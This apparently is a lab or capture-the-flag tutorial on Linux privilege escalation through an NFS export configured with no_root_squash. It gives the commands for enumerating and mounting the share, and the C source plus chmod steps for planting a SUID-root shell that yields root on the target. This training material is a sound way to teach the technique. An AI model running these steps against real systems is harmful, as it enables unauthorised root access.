An NFS export with `no_root_squash` lets a client write files as root. Mount it, create a root-owned SUID shell, run it on the target.
## Goal
Use a no_root_squash export to plant a SUID-root binary that gives you a root shell on the target.
## Tips
You need root on the CLIENT (your Kali) to do this — that's how you write files as UID 0 onto the share. Enumerate exports from outside with showmount.

Checklist:
- [ ] `showmount -e <target>` lists an export?
- [ ] `/etc/exports` shows `no_root_squash` (and `rw`)?
- [ ] is the export writable?
- [ ] do you have root on Kali (to forge the SUID file)?
# Commands

### Step 1: enumerate exports
```bash
showmount -e <target>             # from kali — list NFS exports
cat /etc/exports 2>/dev/null      # on target shell — look for no_root_squash
```

### Step 2: mount it (on kali, as root)
```bash
mkdir /mnt/nfs
mount -o rw,vers=3 <target>:/share /mnt/nfs
```

## Exploit
### Case 1: no_root_squash export
**Enumerate:**
```bash
cat /etc/exports
# /share *(rw,no_root_squash)     <- jackpot: client root = server root on this share
```
**Exploit:**
```bash
# on KALI (root): forge a SUID shell into the share
cat > /mnt/nfs/sh.c <<'END'
#include <unistd.h>
int main(){ setuid(0); setgid(0); execl("/bin/sh","sh",0); }
END
gcc /mnt/nfs/sh.c -o /mnt/nfs/rootsh
chmod +s /mnt/nfs/rootsh
# on TARGET (low-priv shell): the file is root-owned + SUID
/share/rootsh        # -> root shell
```

## Helpline:
1. showmount / exports
```
showmount -e <target>     # list NFS shares (from kali)
flags: rw (writable), no_root_squash (client root = root here).
root_squash (default) maps your root -> nobody = NOT exploitable.
```

2. The SUID-on-share trick
```
mount the share on kali (as root) -> compile a SUID-root /bin/sh into it
-> on the target, that binary runs as root. needs root on KALI to set the bit.
```

3. mount syntax
```
mount -o rw,vers=3 <target>:/share /mnt/nfs   # try vers=2/4 if it fails
```
